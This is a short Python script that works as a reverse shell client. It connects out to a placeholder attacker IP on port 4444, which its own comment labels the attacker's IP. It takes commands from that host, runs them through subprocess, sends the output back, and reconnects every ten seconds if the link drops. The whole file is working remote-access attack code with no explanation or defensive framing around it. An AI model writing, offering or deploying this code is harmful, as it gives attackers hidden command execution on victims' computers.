import socket
import subprocess
import os

SERVER_IP = 'YOUR_SERVER_IP'  # Replace with your attacker's IP
PORT = 4444

while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((SERVER_IP, PORT))

        while True:
            command = client.recv(1024).decode()

            if command.lower() == 'exit':
                break
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    client.send(f"Changed directory to {os.getcwd()}".encode())
                except Exception as e:
                    client.send(str(e).encode())
                continue

            output = subprocess.getoutput(command)
            if output:
                client.send(output.encode())
            else:
                client.send(b"Command executed.")

        client.close()
        break

    except:
        import time
        time.sleep(10)
